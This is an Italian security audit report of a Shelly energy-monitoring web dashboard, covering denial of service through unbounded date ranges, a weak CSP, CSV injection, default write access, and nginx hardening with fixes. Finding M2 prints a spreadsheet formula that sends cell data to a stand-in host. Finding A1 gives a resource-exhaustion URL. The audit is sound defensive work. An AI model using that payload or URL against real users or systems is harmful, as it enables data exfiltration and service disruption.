# Security audit dashboard web — 2026-10-27

Perimetro: `src/shelly_monitor/web.py`, `src/shelly_monitor/web/index.html`, `cli.py serve`, e le funzioni di `store.py` / `report.py` / `pdfreport.py` chiamate dalla dashboard. Versione 0.6.0 (commit e22a6cf). Audit statico read-only; nessuna richiesta HTTP eseguita.
Scenario: esposizione su `https://shelly.example.com` con nginx (TLS) + `auth_request` verso un sidecar a password (cookie HMAC, pattern "the reference nginx + auth sidecar") + `proxy_pass http://127.0.0.1:8787`.

## Riepilogo

| ID | Sev. | Tema | Dove |
|---|---|---|---|
| A1 | ALTA | Range date illimitato + export senza limite, tutto sotto un lock globale: un solo URL blocca la dashboard e gonfia la RAM | web.py:166-179, 285-296, 318-327, 485, 545-555; report.py:44-56, 250-259; pdfreport.py:140-200 |
| M1 | MEDIA | CSP del backend con `'unsafe-inline'` per script e style; se nginx ne aggiunge un'altra si sommano | web.py:27-35; index.html:9, 356, 362 |
| M2 | MEDIA | CSV injection: nomi da Shelly Cloud e nomi dei gruppi custom finiscono nelle celle senza neutralizzazione | report.py:199-216, 250-259; web.py:344-369 |
| M3 | MEDIA | Scritture (gruppi custom) abilitate di default: chiunque abbia superato il login crea/rinomina/cancella gruppi | web.py:428-431, 594-634, 637-639; .env.example:30 |
| B1 | BASSA | `to=9999-12-31` → `OverflowError` non gestito → 500 + stack trace nel log | report.py:52-53; web.py:68-73, 567-569 |
| B2 | BASSA | Nessun timeout socket nel handler; un thread per connessione, senza limite | web.py:491-497, 642-643 |
| B3 | BASSA | Metodi non gestiti e richieste malformate → pagina d'errore HTML di `BaseHTTPRequestHandler`, senza header di sicurezza | web.py:491 (ereditato `send_error`) |
| B4 | BASSA | Header duplicati / CSP doppia se il vhost fa `add_header` senza `proxy_hide_header` | web.py:27-35, 525-533 |
| B5 | BASSA | Cookie del sidecar `SameSite=Lax`: una navigazione top-level cross-site porta il cookie (vettore di A1); cookie HMAC stateless senza revoca | the reference nginx + auth sidecar pattern (`auth_server.py:206`) |
| I1 | INFO | `/api/homes` espone `key_id` (sha256(auth_key)[:12]), `unit_id`, `discovered_name`; versione esposta in `/api/summary`, `/api/config` e header `Server` | web.py:103, 310-316, 407-408, 492 |
| I2 | INFO | Dietro proxy: nessun uso di Host/X-Forwarded-*, nessun redirect né URL assoluto → nessuna host header injection; nei log l'IP è sempre 127.0.0.1 | web.py:518-523 |
| I3 | INFO | SQL: tutto parametrizzato; le f-string interpolano solo costanti o placeholder `?` | store.py:194-204, 302-321, 332-346, 374-429 |
| I4 | INFO | Routing: match esatto su dict, `index.html` letto una volta dalle risorse del package; nessun path traversal. `Content-Disposition` sanificato | web.py:51-52, 381-384, 538-559 |
| I5 | INFO | Frontend: solo `textContent`/`createElement`, nessun `innerHTML`, nessun handler `on*=` inline, query string con `encodeURIComponent` | index.html:396-1199 |
| I6 | INFO | SQLite: letture con `mode=ro` e una connessione per richiesta; all'avvio e per ogni scrittura di gruppo si apre una connessione RW | store.py:208-218; web.py:63-66, 428-431, 647-654 |

Nessun leak di `auth_key`, server cloud (`server` è filtrato in web.py:315), path del DB o stack trace nelle risposte.

## Findings

### A1 — ALTA — Range date illimitato ed export senza limite sotto `_DB_LOCK`

- `parse_range` (report.py:44-56) accetta qualunque `YYYY-MM-DD`. `from=1970-01-01&to=9999-12-30` è valido: 2.932.896 giorni.
- `Dashboard.daily` (web.py:174-178) e `Dashboard.device` (web.py:290-294) generano una voce per ogni giorno del range: circa 2,9 M di dict, JSON da circa 90 MB, centinaia di MB di RAM (solo il ciclo costa circa 1,5 s, misurato). `report.pdf` chiama `daily` e poi `bar_chart` con 2,9 M di barre (pdfreport.py:149, 200); `device.pdf` fa lo stesso su `d["daily"]` (pdfreport.py:256-261).
- `/api/export.csv` (web.py:318-327 → report.py:250-259) scrive *tutti* i campioni del range in uno `StringIO` e poi ne fa `.encode()`: memoria pari a 2 volte il CSV. Con 61 dispositivi a 1 campione al minuto sono circa 32 M di righe all'anno.
- Tutto il lavoro avviene dentro `with _DB_LOCK` (web.py:545, 550, 554), che è globale e non rientrante. Mentre gira un export pesante ogni altra richiesta API resta in coda. Se nginx chiude per `proxy_read_timeout`, il backend continua comunque a calcolare (non c'è cancellazione), e ogni retry o reload accoda un altro job.
- Scenario concreto: un utente loggato (o un sito terzo che fa aprire a un familiare loggato `https://shelly.example.com/api/device.pdf?home=X&id=Y&ch=0&from=1970-01-01&to=9999-12-30`: vedi B5) congela la dashboard per minuti e manda in pressione la RAM della macchina.
- Fix: in `Dashboard._range` rifiutare con 400 i range oltre `MAX_RANGE_DAYS` (es. 1100) e anche `from`/`to` mancanti sulle route con loop giornaliero. In `export_csv` aggiungere un limite di righe (400 oltre `MAX_EXPORT_ROWS`) oppure fare streaming a chunk fuori dal lock.

### M1 — MEDIA — CSP con `'unsafe-inline'`

- web.py:31-34 manda `script-src 'unsafe-inline'; style-src 'unsafe-inline'`. Con un'eventuale XSS futura (oggi il frontend è pulito, I5) la CSP non protegge.
- `index.html` **non** è templato: viene servito byte per byte (web.py:51-52, 543). Gli hash quindi sono stabili per release, ma cambiano a ogni modifica del file.
- Blocchi inline, con hash calcolato sui byte esatti fra i tag:
  - `<script>` unico, righe 362-1199, 44.763 byte: `sha256-H5U1WDllzCs+LtReEv2S+RmuB2Euuf4Ebz3nf2z3LTI=`
  - `<style>` unico, righe 9-212, 14.464 byte: `sha256-Q6RZvFAnHNmUo9Fx0tvt9VQ0JasN8fy0dja7PbEcY9Y=`
  - 3 attributi `style="display:block;padding:12px 18px"` (riga 356): richiederebbero `'unsafe-hashes' 'sha256-xqHVggYE+fKD0aJ4F+fVIst6E7ikP7+4eKYJGVfchBE='`. Meglio spostarli in una classe CSS.
  - Le assegnazioni `el.style.x = ...` via JS (righe 496, 516, 580, 731, 919, 1027, 1038) usano il CSSOM e la CSP non le blocca.
  - Nessun handler `on*=` inline, nessun `eval`/`new Function`, nessuno script o URL esterno. L'unico URL esterno è il namespace SVG `http://www.w3.org/2000/svg` (riga 8 e 648), che è una stringa e non genera richieste.
  - `data:`: solo il favicon SVG (`<link rel="icon" href="data:image/svg+xml,...">`, riga 8), quindi serve `img-src data:`.
  - `fetch` solo su path relativi `/api/...` (righe 431, 965), quindi `connect-src 'self'` basta. I download sono `<a download href="/api/...">` (navigazione).
- Fix (consigliato nel codice, così l'hash resta corretto a ogni release): in `make_server` calcolare `sha256` del contenuto di `<script>` e `<style>` dai byte di `index.html` e costruire la CSP `script-src 'sha256-…'; style-src 'sha256-…'`. Sostituire i 3 `style=""` con una classe. In nginx poi non si ridefinisce la CSP.

### M2 — MEDIA — CSV injection

- `render(..., "csv")` (report.py:203-210) via `_cell` = `str(v)`, `write_samples_csv` (report.py:250-259) e `device_csv` (web.py:348-368) scrivono `home`, `name`, `room`, `device_id` così come sono. `name`/`room` arrivano dall'app Shelly, quindi chiunque abbia accesso all'account cloud di una delle case (nello use case "due appartamenti", anche l'altro nucleo) può chiamare un dispositivo `=HYPERLINK("http://x/?"&A1;"bolletta")`. Il nome di un gruppo custom (`by=group`, report.py:149-170) lo scrive invece chiunque sia loggato.
- Scenario: un familiare apre `shelly-report_….csv` in Excel/LibreOffice e la formula viene eseguita (link di esfiltrazione o DDE, a seconda del client).
- Fix: un `_safe_cell(v)` in report.py che, per i valori `str` che iniziano con `= + - @ \t \r`, aggiunge un `'` in testa. Va usato nei tre writer, solo sui campi testuali (non sui numerici, altrimenti si corromperebbero valori negativi come `-3.5`).

### M3 — MEDIA — Scritture abilitate di default dietro il login

- `make_server` legge `SHELLY_WEB_READONLY` (web.py:638-639): di default è disattivato (`.env.example:30` = `0`). Questo è in contrasto con le note di progetto ("Dashboard: sola lettura"). Una volta esposta, chiunque superi il login può `POST /api/custom-groups`, `PUT …/members`, `DELETE …/{id}`.
- Protezione CSRF presente e corretta: header custom `X-Requested-With: shelly-monitor` e `Content-Type: application/json` obbligatori (web.py:573-582), senza CORS. Validazione: nome lungo 1-60 caratteri, colore `#rrggbb`, membri ≤ 5000 verificati contro `devices` (store.py:484-526), body ≤ 1 MiB (web.py:488, 587). I gruppi sono **nel DB** (tabelle `custom_groups` / `custom_group_members`), non in localStorage.
- Fix: decidere esplicitamente. Se i gruppi si modificano solo da casa, `SHELLY_WEB_READONLY=1` nell'env del servizio esposto e `limit_except GET HEAD` su tutto. Altrimenti si lascia RW e si applicano le direttive nginx dedicate a `/api/custom-groups` (sezione b).

### B1 — BASSA — `OverflowError` sul range

- `to=9999-12-31`: `datetime + timedelta(days=1)` solleva `OverflowError` (report.py:53, verificato), che non è un `ValueError` e quindi sfugge a `_range` (web.py:70-73). Il catch-all restituisce 500 `internal error` (nessun leak in risposta), ma `log.exception` scrive lo stack trace nel journal, un flood di log a costo zero.
- Fix: `except (ValueError, OverflowError, OSError)` in `Dashboard._range` (si risolve insieme ad A1).

### B2 — BASSA — Nessun timeout socket

- `Handler.timeout` non è impostato (None) e `ThreadingHTTPServer` crea un thread daemon per connessione, senza limite. Una connessione aperta e muta tiene vivo un thread per sempre; `_body` fa `rfile.read(length)` bloccante fino a 1 MiB. Il lock DB non viene preso durante la lettura del body (web.py:601-603), quindi gli altri non restano bloccati. Dietro nginx con `proxy_request_buffering on` (default) e HTTP/1.0 verso l'upstream (default, una richiesta per connessione) il rischio è basso, ma resta raggiungibile da chiunque sia in locale sul 127.0.0.1.
- Fix: `timeout = 30` nella classe `Handler` (l'attributo di classe è supportato da `StreamRequestHandler`).

### B3 — BASSA — Pagine d'errore di default

- `OPTIONS`/`PATCH`/`TRACE`/`CONNECT` → `501` e request line malformata → `400`, prodotti da `send_error` di `BaseHTTPRequestHandler`: corpo HTML con il nome del metodo riflesso (escapato), senza `SECURITY_HEADERS`. `HEAD` è un alias di `GET` (web.py:571) ed esegue l'intera query, compresi gli export.
- Fix: `limit_except` in nginx (sezione b); in alternativa override di `send_error` che usi `_json`.

### B4 — BASSA — Header duplicati / CSP doppia con nginx

- Il backend manda già `Cache-Control: no-store`, `X-Content-Type-Options`, `Referrer-Policy` e CSP su ogni risposta (web.py:529-530). Se il vhost copia il pattern di riferimento (`add_header Content-Security-Policy … always` al livello server), il browser riceve **due** CSP e le applica entrambe (intersezione). Con hash sbagliati nella CSP di nginx la pagina si rompe in modo silenzioso, e gli header duplicati sono rumore.
- Fix: o `proxy_hide_header` dei 4 header e CSP solo in nginx, o (preferito, vedi M1) CSP con hash nel backend e in nginx solo gli header che il backend non manda.

### B5 — BASSA — Cookie del sidecar

- Il pattern di riferimento imposta `SameSite=Lax` (auth_server.py:206): una navigazione top-level GET da un altro sito porta il cookie. Le scritture restano protette dall'header custom (M3), ma una GET pesante sì passa (A1). Il cookie HMAC contiene solo la scadenza (auth_server.py:51-65): non è revocabile se non ruotando il secret, e se il secret è condiviso con un'altra app un cookie di quel sito sarebbe valido anche qui (stesso formato `v1.<exp>`).
- Fix: istanza del sidecar con `COOKIE_NAME` e `COOKIE_SECRET` propri, `SameSite=Strict` (costo: arrivando da un link esterno serve un reload) e Max-Age breve. Verificare che `sanitize_next` accetti solo path relativi che iniziano con un singolo `/`.

### I1 — INFO — Dati identificativi esposti agli utenti loggati

- `/api/homes` restituisce `key_id` (48 bit di sha256 della auth_key, non invertibile in pratica), `unit_id` e `discovered_name` del cloud; `server` è rimosso (web.py:315). Versione in `/api/summary.version`, `/api/config.version` e header `Server: shelly-monitor/0.6.0` (`sys_version=""`, quindi niente versione di Python). nginx nasconde già di default l'header `Server` dell'upstream (`proxy_hide_header` implicito), e `server_tokens off` copre quello di nginx. Accettabile per utenti fidati; nessun fix necessario.

### I2 — INFO — Comportamento dietro proxy

- Il codice non legge `Host` né `X-Forwarded-*`, non fa redirect, non costruisce URL assoluti e il frontend usa solo path relativi: nessuna host header injection, nessun problema di schema http/https. `log_request` (web.py:518-520) logga `address_string()`, che dietro proxy vale sempre `127.0.0.1`, e logga a INFO solo le risposte ≥ 400, request line compresa (query con nomi di casa e date, nessun segreto). Per gli IP reali fa fede l'access log di nginx.

### I3 — INFO — SQL

- Tutti i valori provenienti dalla query (`home`, `room`, `id`, `ch`, `grp`, date) passano come parametri `?`. Le f-string di `_filters` (store.py:194-204), `groups`/`channel_groups` (store.py:302-321), `devices`/`samples` (`IN (?,?,…)`, store.py:342, 384) interpolano solo alias costanti o placeholder. `PRAGMA table_info({table})` e `_sql_literal` sono usati solo nelle migrazioni, con valori interni o di config. `grp=c:<id>` accetta solo cifre (web.py:86); `grp=d:<home>/<gid>` è parametrizzato (store.py:438-443).

### I4 — INFO — Routing e header di download

- Il routing è un lookup esatto su dict (web.py:542-559), quindi nessun path traversal; `index.html` è caricato una sola volta da `importlib.resources`. `_filename` (web.py:381-384) tiene solo `[A-Za-z0-9-_.]`, quindi niente CRLF né `"` in `Content-Disposition`. `parse_qs` non ha `max_num_fields`, ma la request line è già limitata a 64 KiB da `http.server` (414). `Content-Type` ha sempre `charset=utf-8` (HTML, JSON, CSV); il PDF è `application/pdf`. Le stringhe nel PDF sono escapate (pdf.py:55-67).

### I5 — INFO — Frontend

- Tutto il DOM è costruito con `textContent`/`createElement`/`setAttribute` (nessun `innerHTML`, `insertAdjacentHTML`, `document.write`). I parametri sono costruiti con `encodeURIComponent` (index.html:404-407, 623, 674, 951-952, 975). `decodeURIComponent` sull'hash (riga 1136) può lanciare `URIError` con un hash malformato: è solo un self-DoS della pagina. Nessun uso di `localStorage`/`sessionStorage`.

### I6 — INFO — SQLite

- Le letture usano `file:…?mode=ro` (store.py:211), con una connessione per richiesta chiusa da `with store`; `check_same_thread=False` è innocuo grazie a `_DB_LOCK`. `serve()` apre una connessione RW all'avvio per migrare (web.py:648-652). Con `SHELLY_WEB_READONLY=0`, ogni scrittura di gruppo apre una `Store` RW (web.py:431) che esegue `_enable_wal` + `_migrate`. Docker: il container ascolta su `0.0.0.0`, ma la porta è pubblicata solo su `127.0.0.1:8787` (docker-compose.yml:24, 32): ok.

## (a) Fix nel codice prima dell'esposizione, in ordine

1. **A1 + B1**: in `Dashboard._range`, intercettare `OverflowError`/`OSError` e rifiutare con 400 i range oltre `MAX_RANGE_DAYS`. Limite di righe (o streaming) su `export_csv`. Test: `from=1970-01-01&to=9999-12-30` → 400 su `/api/daily`, `/api/device*`, `/api/report.pdf`, `/api/export.csv`.
2. **M2**: `_safe_cell` sui campi testuali in `render(csv)`, `write_samples_csv` e `device_csv`. Test con un nome `=1+1` in fixture.
3. **M1**: CSP con hash calcolati a runtime da `index.html` in `make_server`, e i 3 `style=""` della riga 356 spostati in una classe. Togliere `'unsafe-inline'`.
4. **M3**: decidere RW/RO per l'istanza esposta; se RO, `SHELLY_WEB_READONLY=1` nell'unit.
5. **B2**: `timeout = 30` su `Handler`.
6. (opzionale, B3) override di `send_error` in JSON con `SECURITY_HEADERS`.

## (b) Direttive nginx specifiche per questo backend

Da combinare col pattern di riferimento (TLS, `/_auth`, `@login`, `/login`, `/logout`, `server_tokens off`, HSTS, `limit_req`).

```nginx
# contesto http (conf.d/shellymonitor-limits.conf)
limit_req_zone $binary_remote_addr zone=shelly_api:10m    rate=10r/s;
limit_req_zone $binary_remote_addr zone=shelly_export:10m rate=6r/m;
limit_req_zone $binary_remote_addr zone=shelly_login:10m  rate=10r/m;   # per /login del sidecar

upstream shelly_dash { server 127.0.0.1:8787; }

# server { … }
client_max_body_size 1k;                 # default; sovrascritto su /api/custom-groups
client_body_timeout 10s;
client_header_timeout 10s;
send_timeout 30s;
proxy_connect_timeout 2s;
proxy_read_timeout 60s;                  # export/PDF: con il cap di A1 bastano
proxy_send_timeout 10s;
proxy_request_buffering on;              # default: il backend riceve body completi
proxy_buffering on;

# Header che il backend manda già: nasconderli e riemetterli una sola volta da nginx,
# oppure (preferito, M1) tenerli dal backend e NON fare add_header di questi quattro.
proxy_hide_header X-Powered-By;          # assente oggi, difensivo
# Server e Date sono già nascosti da nginx per default.

add_header Strict-Transport-Security "max-age=31536000" always;
add_header X-Frame-Options "DENY" always;
add_header Permissions-Policy "camera=(), microphone=(), geolocation=(), payment=(), usb=()" always;
add_header Cross-Origin-Opener-Policy "same-origin" always;
add_header X-Robots-Tag "noindex, nofollow" always;
```

Se invece la CSP va in nginx (backend invariato), le direttive sono queste e **vanno aggiornate a ogni modifica di index.html**:

```nginx
proxy_hide_header Content-Security-Policy;
proxy_hide_header X-Content-Type-Options;
proxy_hide_header Referrer-Policy;
add_header Content-Security-Policy "default-src 'none'; script-src 'sha256-H5U1WDllzCs+LtReEv2S+RmuB2Euuf4Ebz3nf2z3LTI='; style-src 'sha256-Q6RZvFAnHNmUo9Fx0tvt9VQ0JasN8fy0dja7PbEcY9Y=' 'unsafe-hashes' 'sha256-xqHVggYE+fKD0aJ4F+fVIst6E7ikP7+4eKYJGVfchBE='; img-src 'self' data:; connect-src 'self'; base-uri 'none'; form-action 'none'; frame-ancestors 'none'; object-src 'none'" always;
add_header X-Content-Type-Options "nosniff" always;
add_header Referrer-Policy "no-referrer" always;
```

(Se i 3 `style=""` vengono spostati in una classe, togliere `'unsafe-hashes' 'sha256-xqHV…'`. Ricordare che un `add_header` dentro una `location` annulla quelli ereditati dal server: ripeterli in ogni location che ne ha di propri.)

Location (allowlist; tutte con `auth_request /_auth; error_page 401 = @login; proxy_pass http://shelly_dash;`):

```nginx
location = / { limit_except GET HEAD { deny all; } limit_req zone=shelly_api burst=20 nodelay; … }
location = /index.html { limit_except GET HEAD { deny all; } … }

location ~ ^/api/(summary|report|daily|devices|homes|groups|device|config)$ {
    limit_except GET HEAD { deny all; }
    limit_req zone=shelly_api burst=40 nodelay;
    …
}
location ~ ^/api/(export\.csv|report\.csv|report\.pdf|device\.csv|device\.pdf)$ {
    limit_except GET HEAD { deny all; }
    limit_req zone=shelly_export burst=3 nodelay;
    proxy_read_timeout 120s;
    …
}
# Solo se l'istanza è RW (M3); con SHELLY_WEB_READONLY=1 ridurre a GET HEAD.
location = /api/custom-groups {
    limit_except GET HEAD POST { deny all; }
    client_max_body_size 64k;            # 1 nome + colore: bastano pochi byte
    limit_req zone=shelly_api burst=10 nodelay;
    …
}
location ~ ^/api/custom-groups/[0-9]+(/members)?$ {
    limit_except PUT DELETE { deny all; }   # PUT solo su /members, DELETE solo su /{id}: il backend dà 405 per il resto
    client_max_body_size 256k;           # fino a ~3000 membri; il backend accetta ≤ 5000 e ≤ 1 MiB
    limit_req zone=shelly_api burst=10 nodelay;
    …
}
location / { return 404; }               # tutto il resto
```

Sidecar: istanza dedicata con `COOKIE_NAME`/secret propri, `SameSite=Strict`, `limit_req zone=shelly_login` su `/login`.

## (c) Route complete della dashboard

Parametri comuni dei filtri: `from`, `to` (YYYY-MM-DD), `home`, `room`, `grp` (`c:<id>` | `d:<home>/<group_id>`).

| Metodo | Path | Parametri / body | Risposta |
|---|---|---|---|
| GET, HEAD | `/` , `/index.html` | — | HTML |
| GET, HEAD | `/api/summary` | filtri | JSON |
| GET, HEAD | `/api/report` | filtri + `group`=day\|month\|total, `by`=channel\|room\|home\|group | JSON |
| GET, HEAD | `/api/daily` | filtri | JSON |
| GET, HEAD | `/api/devices` | filtri + `group` (nome gruppo cloud), `q` (testo) | JSON |
| GET, HEAD | `/api/homes` | — | JSON |
| GET, HEAD | `/api/groups` | `home` | JSON |
| GET, HEAD | `/api/device` | `home`, `id`, `ch` (int), `from`, `to` | JSON |
| GET, HEAD | `/api/custom-groups` | `from`, `to` | JSON |
| GET, HEAD | `/api/config` | — | JSON |
| GET, HEAD | `/api/export.csv` | filtri | CSV allegato |
| GET, HEAD | `/api/report.csv` | filtri + `group`, `by` | CSV allegato |
| GET, HEAD | `/api/report.pdf` | filtri | PDF allegato |
| GET, HEAD | `/api/device.csv` | come `/api/device` | CSV allegato |
| GET, HEAD | `/api/device.pdf` | come `/api/device` | PDF allegato |
| POST | `/api/custom-groups` | JSON `{id?, name, color?}`; header `X-Requested-With: shelly-monitor`, `Content-Type: application/json` | JSON (403 se readonly) |
| PUT | `/api/custom-groups/{id}/members` | JSON `{members: [{key_id\|home, device_id, channel}]}` ≤ 5000; stessi header | JSON |
| DELETE | `/api/custom-groups/{id}` | header `X-Requested-With: shelly-monitor` | JSON |

Ogni altro path restituisce 404 JSON; altri metodi su `/api/custom-groups*` danno 405, mentre metodi non implementati (OPTIONS, PATCH, …) danno 501 HTML (B3).
